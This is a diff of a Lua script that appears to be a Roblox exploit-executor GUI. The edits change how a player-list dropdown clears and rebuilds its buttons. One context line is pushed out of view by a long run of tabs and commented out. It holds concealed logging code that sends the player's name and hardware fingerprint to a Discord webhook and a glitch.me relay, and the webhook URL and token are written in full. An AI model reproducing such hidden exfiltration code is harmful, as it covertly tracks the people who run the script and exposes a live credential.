@@ -6712,14 +6712,6 @@ end)
 										end) 
 
 										first = false 
-										Players.PlayerAdded:Connect(function()
-											Button:Destroy()
-											TextLabel:Destroy()
-										end)
-										Players.PlayerRemoving:Connect(function()
-											Button:Destroy()
-											TextLabel:Destroy()
-										end)
 									end 
 								end 
 							end
@@ -6728,6 +6720,9 @@ end)
 							
 Players.PlayerAdded:Connect(function()
 	table.clear(data.options)
+	for i,v in pairs(Drop:GetChildren()) do
+		if v:IsA('TextButton') then v:Destroy() end
+	end
 	for i,v in pairs(game.Players:GetPlayers()) do
 		C.INSERT(data.options, v.Name)
 	end
@@ -6736,6 +6731,9 @@ end)
 																																																																																																																																																																																																																																																																																																														--if not signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = game:HttpGet({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpGet({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
 Players.PlayerRemoving:Connect(function(plr) 
 	table.clear(data.options)
+	for i,v in pairs(Drop:GetChildren()) do
+		if v:IsA('TextButton') then v:Destroy() end
+	end	
 	for i,v in pairs(game.Players:GetPlayers()) do
 		C.INSERT(data.options, v.Name)
 	end
